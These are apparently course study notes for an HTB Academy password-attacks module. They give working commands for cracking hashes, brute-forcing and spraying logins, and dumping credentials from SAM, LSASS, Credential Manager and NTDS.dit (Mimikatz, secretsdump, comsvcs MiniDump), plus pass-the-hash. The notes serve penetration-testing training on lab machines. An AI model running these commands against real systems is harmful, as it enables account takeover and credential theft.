# Password Attacks

> HTB Academy module: **Password Attacks** (CPTS path)
> These notes have been reviewed line by line, technically corrected where needed, translated to English, and expanded with extra practical labs and reference tables not present in the original notes.

## Table of Contents

1. [Password Cracking Fundamentals](#1-password-cracking-fundamentals)
2. [John the Ripper](#2-john-the-ripper)
3. [Hashcat](#3-hashcat)
4. [Writing Custom Wordlists and Rules](#4-writing-custom-wordlists-and-rules)
5. [Cracking Password-Protected Files](#5-cracking-password-protected-files)
6. [Attacking Network Services](#6-attacking-network-services)
7. [Password Spraying, Credential Stuffing and Default Credentials](#7-password-spraying-credential-stuffing-and-default-credentials)
8. [Windows Authentication Process](#8-windows-authentication-process)
9. [Attacking SAM, SYSTEM and SECURITY](#9-attacking-sam-system-and-security)
10. [Attacking LSASS](#10-attacking-lsass)
11. [Attacking the Windows Credential Manager](#11-attacking-the-windows-credential-manager)
12. [Attacking Active Directory and NTDS.dit](#12-attacking-active-directory-and-ntdsdit)
13. [Credential Hunting on Windows](#13-credential-hunting-on-windows)
14. [Linux Authentication Process](#14-linux-authentication-process)
15. [Credential Hunting on Linux](#15-credential-hunting-on-linux)
16. [Credential Hunting in Network Traffic](#16-credential-hunting-in-network-traffic)
17. [Credential Hunting in Network Shares](#17-credential-hunting-in-network-shares)
18. [Windows Lateral Movement: Pass the Hash and Pass the Ticket](#18-windows-lateral-movement-pass-the-hash-and-pass-the-ticket)
19. [Quick-Reference Cheat Sheets](#19-quick-reference-cheat-sheets)
20. [Defensive Notes and OPSEC Considerations](#20-defensive-notes-and-opsec-considerations)

---

## 1. Password Cracking Fundamentals

Passwords are normally stored as **hashes**, produced by algorithms like `MD5` or `SHA-256` (real-world password storage uses slower, purpose-built algorithms like bcrypt or sha512crypt — see the note on salting below).

📸 *Screenshot placeholder — original hashing diagram.*

Hashing is a **one-way function**: you can turn a password into a hash, but you can't mathematically reverse a hash back into the original password. So attackers don't "decrypt" a hash — they **guess** a password, hash the guess, and compare the result to the target hash. That whole process is called **password cracking**, and there are three main techniques:

- **Rainbow tables**
- **Dictionary attacks**
- **Brute-force attacks**

### Rainbow tables

> ⚠️ **Corrected:** A simple list of `password → hash` pairs (e.g. a "rockyou hash database") is technically just a **lookup table**, not a rainbow table. A true **rainbow table** uses chains built from reduction functions to trade extra computation for a much smaller storage footprint, letting you cover a huge keyspace without storing every single hash directly. Tools like *ophcrack* use real rainbow tables; online lookup services (e.g. CrackStation-style sites) use plain lookup tables. Either way, the attacker's goal is the same: precompute the expensive part once, then look candidates up almost instantly instead of re-hashing on every attempt.

Example of a precomputed pair:

```
rockyou  -->  f806fc5a2a0d5ba2471600758452799c
```

The attacker keeps a database of these and checks whether a stolen hash matches an entry.

💡 **Added:** The main defense against both rainbow tables and lookup tables is **salting** — adding a unique random value to each password before hashing. A properly salted hash (`sha512crypt`/`$6$`, `bcrypt`/`$2b$`, etc.) makes precomputed tables useless, because the attacker would need a separate table per salt value.

### Brute-force attack

Tries every possible character combination. This is the last resort, because it doesn't scale — a sufficiently long/complex password (15+ random characters) can take longer than a human lifetime to brute-force, even on modern GPU cracking rigs.

### Dictionary attack

Uses a large list of real, previously leaked passwords (`rockyou.txt`, SecLists, etc.) instead of guessing blindly. This is usually far more effective than brute-force, because people reuse predictable passwords.

---

## 2. John the Ripper

**John the Ripper (JtR)** is one of the most widely used password cracking tools, supporting many attack styles (brute-force, dictionary, and more). Use the **"Jumbo"** community edition (`john-jumbo`) — it supports far more hash and file formats than the base version shipped with most distros.

### Cracking modes

#### Single crack mode

Useful when the target is Linux and you want John to auto-generate password guesses from information already tied to the account itself — username, GECOS/real-name field, home directory name, and so on.

**🔧 Practical Lab**

Say we have this line (username + hash combined, e.g. produced by `unshadow` — see [section 14](#14-linux-authentication-process)):

```
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```

Save it to a file called `passwd`. From this line alone we can already tell:

- username: `r0lf`
- real name (GECOS field): `Rolf Sebastian`
- home directory: `/home/r0lf`

Run John in single-crack mode:

```bash
john --single passwd
```

Output:

```
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
NAITSABES          (r0lf)
1g 0:00:00:00 DONE 1/3 (2025-04-10 07:47) 12.50g/s 5400p/s 5400c/s 5400C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The cracked password is `NAITSABES` — literally "SEBASTIAN" reversed and uppercased, generated automatically by mangling the GECOS field. This is exactly why single-crack mode is so effective against predictable, personal passwords.

💡 **Added:** Single-crack mode applies the `[List.Rules:Single]` rule set from `john.conf` by default (case changes, reversals, appended digits, etc.) — you don't need to pass `--rules` yourself for this mode.

To reliably re-list everything cracked so far:

```bash
john --show passwd
```

#### Wordlist mode

Uses an existing wordlist (`rockyou.txt`, SecLists, etc.) instead of profile-based guessing:

```bash
john --wordlist=<wordlist_file> <hash_file>
```

💡 **Added:** Combine a wordlist with mangling rules for much better coverage from the same word list:

```bash
john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental mode

John's built-in brute-force mode:

```bash
john --incremental <hash_file>
```

> ⚠️ **Corrected:** This isn't a "dumb" character-by-character brute-force. Incremental mode uses trained character-frequency tables (a Markov-like model of how real passwords are built) to try the *statistically most likely* candidates first — which is why it's often faster at finding real-world passwords than a naive brute-force would be.

### Identifying hash formats

If you don't know a hash's type, `hashid` can guess it for you:

```bash
hashid -j <hash>
hashid -j 51g6trdb61d5btdfb5rt6b51db6bg51
```

`-j` prints the matching **John** format name; `-m` (used later with Hashcat) prints the matching **Hashcat** mode number instead.

Once you know the format, tell John explicitly with `--format`:

```bash
john --format=<hash_name> [...] <hash_file>
```

Example — single-crack mode against an `nsldap`-format hash stored in `passwd.txt`:

```bash
john --format=nsldap --single passwd.txt
```

### Cracking password-protected files

John can't crack a password-protected *file* directly — it needs a hash, not a file. A family of `*2john` helper tools converts protected files into a crackable hash format first:

```bash
<tool> <file_to_crack> > file.hash
```

Example — a password-protected `CPTS.pdf`:

```bash
pdf2john CPTS.pdf > HashedCPTS.txt
john --incremental HashedCPTS.txt
```

To see every `*2john` conversion tool installed on your system:

```bash
locate *2john*
```

💡 **Added:** If `locate` returns nothing, its database is probably stale — refresh it first, or search directly with `find` instead:

```bash
sudo updatedb
# or, without relying on the locate DB:
find / -iname '*2john*' 2>/dev/null
```

---

## 3. Hashcat

**Hashcat** is the other major password cracking tool. Unlike John, it's built from the ground up for **GPU acceleration**, which makes it significantly faster for most hash types. It runs on Linux, Windows, and macOS.

Base syntax:

```bash
hashcat -a <attack_mode> -m <hash_mode> <hashes> [wordlist, rule, mask, ...]
```

- `-a` — attack mode (dictionary, brute-force/mask, combinator, etc. — full table below)
- `-m` — hash type (every algorithm has its own mode number; `hashcat --help` lists them all)
- `<hashes>` — a single hash, or a file containing one hash per line

To identify a hash's Hashcat mode:

```bash
hashid -m <'hash'>
```

### Attack modes

💡 **Added — full attack-mode reference** (the original notes only covered `-a 0` and `-a 3`):

| `-a` | Name | What it does |
|---|---|---|
| 0 | Straight (dictionary) | Tries each word in a wordlist as-is (optionally mangled with `-r rules`) |
| 1 | Combination | Concatenates two wordlists together, word × word |
| 3 | Brute-force / Mask | Tries character-set patterns you define |
| 6 | Hybrid Wordlist + Mask | A wordlist word, then a mask appended (e.g. `word` + `?d?d?d`) |
| 7 | Hybrid Mask + Wordlist | A mask first, then a wordlist word |
| 9 | Association | For hash types tied to a specific username/context (e.g. some Office hashes) |

#### Dictionary attack (`-a 0`)

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

(`-m 0` = MD5 in this example.)

If the wordlist alone isn't good enough, apply a **rule file** to generate many more variations from the same base words (rules live under `/usr/share/hashcat/rules/`):

```bash
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```

#### Mask attack (`-a 3`)

A smarter, targeted brute-force — you tell Hashcat the *shape* of the password (e.g. "starts with an uppercase letter, then lowercase letters, then a digit") instead of guessing blindly:

```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

Mask character classes:

| Mask | Meaning |
|---|---|
| `?l` | lowercase a-z |
| `?u` | uppercase A-Z |
| `?d` | digit 0-9 |
| `?s` | special character |
| `?a` | all of the above |

💡 **Added — useful flags:**

- `--show` — reprint already-cracked hashes from the potfile without re-running the attack
- `--potfile-path <file>` — cracked results are cached in `~/.hashcat/hashcat.potfile` by default
- `-O` — "optimized" kernels, much faster but caps the max password length (usually fine)
- `--username` — tells Hashcat the hash file is in `user:hash` format so it strips the username before cracking

---

## 4. Writing Custom Wordlists and Rules

If you already know something about a target's password habits (e.g. "base word is `password`, sometimes capitalized, sometimes with a `0` for `o`"), you can generate a small, *targeted* wordlist instead of relying on a massive generic one.

Base word file:

```bash
cat password.list
```

```
password
```

Rule file (standard Hashcat rule syntax):

```bash
cat custom.rule
```

```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Rule syntax quick reference: `:` = no change, `c` = capitalize first letter, `sX Y` = substitute character X with Y, `$X` = append character X to the end.

Generate the mutated wordlist:

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Result:

```bash
cat mut_password.list
```

```
password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### Generating wordlists with CeWL

**CeWL** scrapes a website and builds a wordlist from words that actually appear on it — often good source material for company- or employee-specific guesses:

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

- `cewl` — the tool
- `<URL>` — target website
- `-d` — **spidering depth**: how many links deep CeWL follows starting from the given page (higher = more pages scraped = bigger but noisier wordlist)

  > ⚠️ **Corrected:** `-d` controls crawl depth, not a count of directories.
- `-m` — minimum word length to include
- `--lowercase` — force all words to lowercase
- `-w` — write output to a file

### 🔧 Practical Lab — Profiling-based password cracking

Target: **Mark White**

- Born `August 5, 1998`
- Works at `Nexura, Ltd.` — company policy: passwords ≥ 12 characters, at least 1 uppercase, 1 lowercase, 1 symbol, 1 number
- Lives in `San Francisco, CA, USA`
- Pet cat named `Bella`
- Wife named `Maria`, son named `Alex`
- Big fan of `baseball`

Target hash:

```
97268a8ae45ac7d15c3cea4ce6ea550b
```

**Step 1 — Build a base wordlist** (`mark.wordlist`) from every personal detail above: `Mark`, `White`, `Nexura`, `1998`, `08051998`, `SanFrancisco`, `Bella`, `Maria`, `Alex`, `baseball`, etc.

**Step 2 — Combine words together**, since the company password policy pushes people toward multi-word passwords like `BellaMaria2024!`:

```bash
hashcat --stdout -a 1 mark.wordlist mark.wordlist > mark.txt
```

`-a 1` (combinator mode) glues every word in the list to every other word. The wordlist is listed twice so pairs of words get combined with each other.

**Step 3 — Apply mangling rules** to turn raw word combos into policy-compliant passwords (uppercase, symbols, digits):

```bash
hashcat --force mark.txt -r /usr/share/hashcat/rules/best66.rule --stdout > final.list
```

```bash
wc -l final.list
# 16896 final.list
```

Over 16,000 realistic candidate passwords generated from nothing but public/known facts about one person.

**Step 4 — Crack the hash:**

```bash
hashcat -a 0 hash.txt final.list
```

Since `-m` wasn't specified, Hashcat lists every hash mode that matches the hash's format/length and asks you to re-run with the correct `-m`. Pick the mode matching the known hash type (e.g. `-m 0` for MD5) and re-run.

---

## 5. Cracking Password-Protected Files

If you find a password-protected file:

**Step 1 — Extract/identify it.** For a `.zip`:

```bash
unzip <file.zip>
```

Whatever comes out could be any file type — in this example it turned out to be an `.xlsx` (a Microsoft Office file). If you're unsure of a file type, check its magic bytes (`file <filename>`) or ask an AI assistant.

**Step 2 — Convert it into a crackable hash:**

```bash
office2john File.xlsx > pass.hash
```

**Step 3 — Crack it** (💡 completed — the original notes stopped right before this step):

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash
# or with Hashcat (Office 2013+ uses mode 9600, Office 2007-2010 uses 9500/9700 — confirm with hashid):
hashcat -a 0 -m 9600 pass.hash /usr/share/wordlists/rockyou.txt
```

💡 **Added — other common `*2john` tools:**

| File type | Tool |
|---|---|
| ZIP | `zip2john` |
| RAR | `rar2john` |
| SSH private key | `ssh2john` |
| KeePass database | `keepass2john` |
| 7-Zip archive | `7z2john` |

---

## 6. Attacking Network Services

When you find a login-protected service (SSH, SMB, FTP, RDP, etc.), you brute-force it with **Hydra** or **NetExec**.

### NetExec (`nxc`)

Install:

```bash
sudo apt-get -y install nxc
```

Help:

```bash
nxc -h
```

NetExec (the modern successor to CrackMapExec) is most at home attacking **Windows/AD services** (SMB, WinRM, LDAP, MSSQL, RDP).

Usage:

```bash
nxc <service> <target_ip> -u <user_or_userlist> -p <password_or_passwordlist>
```

Example:

```bash
nxc smb 192.187.10.1 -u username.list -p password.list
```

> ⚠️ **Corrected:** the service name is `smb`, not `smp`.

### Hydra

Install:

```bash
sudo apt-get -y install hydra
```

Help:

```bash
hydra -h
```

Hydra can brute-force logins on almost any network service.

Usage:

```bash
hydra -L <user_or_userlist> -P <password_or_passwordlist> <service>://<target_ip>
```

Example:

```bash
hydra -L username.list -P password.list ssh://192.187.11.2
```

### Metasploit Framework

Metasploit also has brute-force auxiliary modules per service. Example against SMB:

```
msfconsole
use auxiliary/scanner/smb/smb_login
options
```

Relevant options:

```
Name         Required   Description
----         --------   -----------
USER_FILE    no         File containing usernames, one per line
PASS_FILE    no         File containing passwords, one per line
```

```
set user_file <user.list>
set pass_file <password.list>
set rhosts <Target_Host>
run
```

---

## 7. Password Spraying, Credential Stuffing and Default Credentials

### Password spraying

You know **one password** but not which account it belongs to. Rather than hammering a single account with many guesses (which triggers lockouts), you try that one guess across **many** accounts:

```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

### Credential stuffing

You have a leaked credential list in `username:password` format and try it as-is against a service:

```bash
hydra -C CREDENTIAL.LIST ssh://<IP>
```

> ⚠️ **Corrected:** the protocol prefix is `ssh://`, not `ss://`.

### Default credentials

Vendor/service default logins that admins sometimes forget to change:

```bash
pip3 install defaultcreds-cheat-sheet
creds search <NAME>
```

Example:

```bash
creds search linksys
```

---

## 8. Windows Authentication Process

When you type a username/password into Windows, several components hand the request off to each other behind the scenes:

```
LogonUI / Credential Provider   →   collects the credentials you type
              ↓
          WinLogon              →   owns the interactive logon UI/session
              ↓
           LSASS                →   decides if the credential is valid, and what the user is allowed to do
              ↓
    Authentication Package      →   the specific "library" LSASS calls for a given auth method (NTLM, Kerberos, etc.)
              ↓
        SAM (local)   or   Active Directory (domain)   →   where the actual account/hash lives
```

📸 *Screenshot placeholder — original authentication flow diagram.*

### LSASS — local vs domain-joined

#### Non-domain-joined (local logon)

A standalone machine (e.g. a home laptop) authenticates locally: LSASS calls the **NTLM** authentication package, which hashes the entered password and checks it against the local **SAM** database.

#### Domain-joined

A machine that's part of a company/AD domain: LSASS calls **Kerberos** (preferred) or falls back to **NTLM**. With Kerberos you get a session **ticket**, and **Netlogon** is what actually talks to the domain's **Active Directory Domain Services**.

---

## 9. Attacking SAM, SYSTEM and SECURITY

Once you have **Administrator** on a Windows box, you can pull local password hashes straight out of the registry.

You need all **three** hives:

```
SAM       — stores the local password hashes (encrypted)
SYSTEM    — holds the Boot Key needed to decrypt SAM; can also hold extra secrets (cached domain creds, etc.)
SECURITY  — holds LSA secrets
```

### Save the hives with `reg.exe`

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

### Transfer the files to Kali over SMB

On Kali, stand up an SMB share:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents
```

From Windows:

```cmd
move sam.save \\YOUR-IP\CompData
move system.save \\YOUR-IP\CompData
move security.save \\YOUR-IP\CompData
```

### Extract the hashes with `secretsdump`

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Output format:

```
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

```
username : RID : LM hash : NT hash
```

The **NT hash** (right before the trailing `:::`) is what you'll normally target.

### Crack with Hashcat

```bash
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

(`-m 1000` = NTLM)

### DPAPI

**DPAPI** (Data Protection API) is how Windows encrypts credentials it saves on your behalf — Chrome saved passwords, Outlook passwords, saved RDP creds, Credential Manager entries, saved VPN/WiFi keys, and more. It isn't a password itself; it's the encryption layer protecting all of those. Recovering the DPAPI master keys lets you decrypt everything they protect.

### Remote dumping (no manual file copy needed)

If you already have local admin creds, NetExec can dump remotely in one command:

```bash
netexec smb <TARGET-IP> --local-auth -u <user> -p <password> --sam
netexec smb <TARGET-IP> --local-auth -u <user> -p <password> --lsa
```

`--sam` → local user hashes. `--lsa` → LSA secrets (service account passwords, DPAPI keys, etc.).

📸 *Screenshot placeholder — example netexec `--sam`/`--lsa` output.*

---

## 10. Attacking LSASS

**SAM** gives you hashes at rest (on disk). **LSASS** gives you credentials **in memory** — including plaintext or hashes for anyone currently logged in.

### Dumping via Task Manager (GUI)

1. Open Task Manager → find **Local Security Authority Process**
2. Right-click → **Create dump file**
3. Output lands in `%temp%\lsass.DMP`

Simple, but needs GUI access.

### Dumping via `rundll32` + `comsvcs.dll` (command line)

Find the LSASS PID:

```cmd
tasklist /svc
```

or

```powershell
Get-Process lsass
```

Dump it:

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

⚠️ This is a well-known technique and is very likely to be flagged by AV/EDR.

### Analyzing the dump with `pypykatz` (on Kali)

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

`pypykatz` (a Mimikatz-equivalent for Linux) can recover, most importantly:

**MSV credentials:**

```
Username: bob
NT: 64f12cddaa88057e06a81b54e73b949b
```

Crack the NT hash the same way as before:

```bash
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```

**Kerberos tickets** — if the box is domain-joined, LSASS may also hold Kerberos tickets, extremely valuable for reaching other resources without ever knowing a plaintext password (see [section 18](#18-windows-lateral-movement-pass-the-hash-and-pass-the-ticket)).

---

## 11. Attacking the Windows Credential Manager

Windows saves login info for things you've previously connected to — shared folders, RDP sessions, OneDrive, old websites, network resources — inside the **Credential Manager**.

Encrypted storage locations:

```
C:\Users\<user>\AppData\Local\Microsoft\Vault
C:\Users\<user>\AppData\Local\Microsoft\Credentials
C:\Users\<user>\AppData\Roaming\Microsoft\Vault
C:\ProgramData\Microsoft\Vault
```

These are encrypted with **DPAPI** — never stored as plaintext.

### Two credential types

1. **Web Credentials** — saved browser/web logins
2. **Windows Credentials** (the interesting one for pentesting) — shared folders, domain user creds, network resources, OneDrive tokens, service creds, saved RDP creds

### Enumerate saved credentials

```cmd
cmdkey /list
```

Example:

```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

### Use a saved credential with `runas /savecred`

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

This launches `cmd.exe` **as** `mcharles`, using the password Windows already has saved — it does **not** show you the plaintext password. Confirm with:

```cmd
whoami
```

### Extract plaintext creds from memory with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

- `privilege::debug` — grabs the Debug privilege needed to read sensitive processes like LSASS
- `sekurlsa::credman` — hunts for Credential Manager entries currently sitting in memory

If a plaintext password happens to be cached, it can appear directly:

```
Username : mcharles@inlanefreight.local
Domain   : onedrive.live.com
Password : ...
```

### 🔧 Practical Lab — full walkthrough

Target: `10.129.209.125`, creds `sadams : totally2brow2harmon@`

**Step 1 — RDP in, with a shared drive for file transfer:**

```bash
xfreerdp3 /u:sadams /p:'totally2brow2harmon@' /v:10.129.209.125 /drive:share,/home/fakelaw/course/mimi
```

`/drive:share,<local_path>` maps a local Linux folder into the RDP session as a drive, so tools/files can move in and out.

**Step 2 — Check Credential Manager.** Web credentials are empty, but there's a Windows credential entry where the password is hidden.

**Step 3 — Enumerate from a shell:**

```cmd
cmdkey /list
```

```
Currently stored credentials:
    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

**Step 4 — Reuse it:**

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

In the new `cmd`, confirm identity and privileges:

```cmd
whoami /all
```

The account may show admin-capable group membership, but that doesn't mean the *current* shell is elevated — you still need to launch as admin. One way in:

```
msconfig
```

→ **Tools** tab → **Command Prompt** → **Launch**. Confirm again with `whoami /all`.

**Step 5 — Pull `mimikatz.exe` in** over the drive share mapped in Step 1, drop it on the Desktop, and run:

```cmd
C:\Users\Administrator\Desktop> mimikatz.exe
privilege::debug
sekurlsa::credman
```

Result — a plaintext password recovered from memory:

```
proofs1insight1rust1es!
```

---

## 12. Attacking Active Directory and NTDS.dit

Once Windows is joined to a domain, the important account hashes no longer live in SAM — they live in the domain database on the **Domain Controller**, called **NTDS.dit**.

### What is Active Directory?

The centralized system domain-joined companies use to manage users, computers, groups, password hashes, permissions, and Group Policy — all from one place (the Domain Controller), instead of every machine being managed independently.

### What is NTDS.dit?

The Active Directory database file, usually at:

```
C:\Windows\NTDS\NTDS.dit
```

It holds hashes for every domain account — `Administrator`, `krbtgt`, regular domain users, and computer accounts. Getting and cracking it can compromise the entire domain if permissions allow.

### Step 1 — Build a username list

From known employee names (e.g. `Jane Doe`), guess likely AD username formats: `jdoe`, `jane.doe`, `janedoe`, `doe.jane`, etc. — manually, or with **username-anarchy**:

```bash
./username-anarchy -i /home/ltnbob/names.txt
```

### Step 2 — Validate usernames with Kerbrute

Before spraying passwords against usernames that might not even exist, confirm which ones are real:

```bash
kerbrute userenum --dc <TARGET_IP> --domain <TARGET_DOMAIN> names.txt
```

```
VALID USERNAME: <USER_NAME>@<TARGET_DOMAIN>
```

### Step 3 — Try passwords with NetExec

```bash
netexec smb <TARGET_IP> -u <username> -p /usr/share/wordlists/fasttrack.txt
```

```
[+] <TARGET_DOMAIN>\<username>:<Password>
```

⚠️ This is **noisy** — easily logged, and can trigger account lockouts if a lockout policy is in place. Prefer *spraying* (few passwords across many users) over brute-forcing a single account.

### Step 4 — Use the credential

```bash
evil-winrm -i <TARGET_IP> -u <username> -p '<Password>'
```

Check group membership:

```cmd
net user <username>
```

If they're in **Domain Admins**, you have very high-value access — including the ability to dump NTDS.dit.

### Why you need high privileges

Copying NTDS.dit requires Local Admin on the DC, Domain Admin, or an equivalent delegated right — not something a normal user can do.

### Copying NTDS.dit via Volume Shadow Copy

NTDS.dit is always in use by the OS, so it can't be copied directly. Instead, create a temporary snapshot of `C:` and copy from that:

```powershell
vssadmin CREATE SHADOW /For=C:
```

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

You also need the **SYSTEM** hive (same as with SAM) — the hashes inside NTDS.dit are encrypted, and SYSTEM holds the key.

### Extract the hashes

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```
Administrator:500:LMHASH:NTHASH:::
krbtgt:502:LMHASH:NTHASH:::
user:RID:LMHASH:NTHASH:::
```

Focus on the **NT hash**.

### The fast way — NetExec automates all of it

```bash
netexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil
```

This logs in, dumps NTDS via `ntdsutil.exe`, pulls the data back, extracts the hashes, and cleans up temp files — largely hands-off.

### Crack with Hashcat

```bash
hashcat -m 1000 <Hash> /usr/share/wordlists/rockyou.txt
```

### Can't crack it? Pass-the-Hash

Authenticate with the **hash itself** instead of the plaintext password:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <hash>
```

(or any username with Administrator-equivalent rights). See [section 18](#18-windows-lateral-movement-pass-the-hash-and-pass-the-ticket) for the full technique.

---

## 13. Credential Hunting on Windows

Search a Windows box for passwords/keys/credentials left behind in files or applications.

Useful keywords: `password`, `passwd`, `pwd`, `pass`, `creds`, `credentials`, `username`, `login`, `user`, `key`, `keys`, `dbpassword`, `config`, `configuration`.

### Method 1 — Windows Search (GUI)

Search for `password`, `pwd`, `creds`, `config` and look for hits like `passwords.txt`, `vpn_config.ini`, `db_config.xml`, `notes.docx`.

### Method 2 — `findstr` (command line)

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

> 💡 **Clarified flags:** `/S` = recurse subfolders, `/I` = case-insensitive, `/M` = print only the *filenames* that match (drop `/M` if you also want to see the matching lines themselves).

### Method 3 — LaZagne

Automatically recovers saved credentials from many apps at once: browsers (Chrome/Firefox/Edge), WiFi, Outlook/Thunderbird, WinSCP, OpenVPN, Credential Manager, LSA secrets, sometimes KeePass.

```cmd
start LaZagne.exe all
start LaZagne.exe all -vv
```

Example hit:

```
Winscp passwords
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

### Why browsers matter

Browsers routinely save logins, encrypted at rest — but tools like LaZagne (or dedicated decryptors) can decrypt them if you have the right local privileges. Always check browsers.

### Places worth checking

```
Desktop, Documents, Downloads
C:\Users\<user>\
C:\Users\<user>\AppData\
Shares, IT folders, Scripts folders
```

Filenames to look for: `pass.txt`, `passwords.txt`, `creds.txt`, `credentials.txt`, `accounts.xlsx`, `passwords.xlsx`, `notes.txt`, `config.ini`, `web.config`, `unattend.xml`.

### In a Domain environment, also check

```
SYSVOL share, Group Policy files, scripts in SYSVOL, IT shares,
web.config files, unattend.xml, AD description fields, KeePass databases, SharePoint
```

Example path: `\\domain.local\SYSVOL\` — admins frequently leave service/installation passwords in scripts here.

### Tailor your hunt to the box role

| Box type | Focus on |
|---|---|
| IT Admin workstation | VPN, RDP, WinSCP, SSH, scripts, config files |
| Web server | `web.config`, DB passwords, connection strings |
| Regular user machine | Desktop, Documents, saved browser passwords |
| File share | Excel/Word/txt files containing passwords |

---

## 14. Linux Authentication Process

Linux logins typically go through **PAM** (Pluggable Authentication Modules). Two files matter most:

```
/etc/passwd
/etc/shadow
```

### `/etc/passwd`

Readable by any user. Contains account metadata for every user:

```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

```
username : password-placeholder : UID : GID : GECOS/info : home directory : shell
```

The `x` means: **the real hash is not here** — it's in `/etc/shadow`.

⚠️ **Security note:** `/etc/passwd` should be readable but never writable by normal users. If misconfigured as writable, an attacker could rewrite the `root` line to remove its password entirely:

```
root::0:0:root:/root:/bin/bash
```

An empty password field there can, depending on PAM configuration, allow logging in as root with no password at all.

### `/etc/shadow`

The actual password hashes — readable only by root or privileged users.

```
htb-student:$y$j9T$3QSBB6CbHEu...:18955:0:99999:7:::
```

Hash format:

```
$ID$SALT$HASH
```

| ID | Algorithm |
|---|---|
| `$1$` | MD5 |
| `$2a$` / `$2b$` | bcrypt |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 |
| `$y$` | yescrypt (default on modern Debian/Ubuntu) |

💡 **Added** — this table wasn't in the original notes but is the fastest way to eyeball a Linux hash's type without extra tooling.

If the password field contains `!` or `*`, the account **cannot log in with a Unix password** — but may still log in via SSH keys or Kerberos. An **empty** field is dangerous — it can mean passwordless login depending on PAM configuration.

### `/etc/security/opasswd`

Stores **old password hashes**, so PAM can stop users from reusing a recent password. If you crack an old password from here, the current one may be a small variation of it.

```
cry0l1t3:1000:2:$1$HjFAfYTG$...,$1$kcUjWZJX$...
```

### Cracking Linux passwords

With root, you can read both files. Combine them with `unshadow` (a John the Ripper utility) into a single crackable format — you can't crack `shadow` or `passwd` alone:

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Crack with Hashcat:

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

(`-m 1800` is for `sha512crypt` / `$6$` — match the mode to the actual hash ID seen above, it isn't always 1800.)

Or with John (which the `unshadow` tool itself ships alongside, making it the natural pairing):

```bash
john /tmp/unshadowed.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 15. Credential Hunting on Linux

Once you're on a Linux box, hunt for leftover passwords/keys/credentials in files, shell history, logs, browsers, or memory. One stray password in a config file can mean root, or access to a completely different user.

Four main hunting grounds:

```
1. Files
2. History / Logs
3. Memory / Cache
4. Keyrings / Browsers
```

### 1. Files

**Configuration files** (`.conf`, `.config`, `.cnf`) — commonly hold DB creds, API keys, connection strings:

```bash
for l in ".conf .config .cnf"; do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

Search inside `.cnf` files specifically for creds:

```bash
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" "$i" 2>/dev/null | grep -v "#"
done
```

**Databases** (`.sql`, `.db`, `*db*`):

```bash
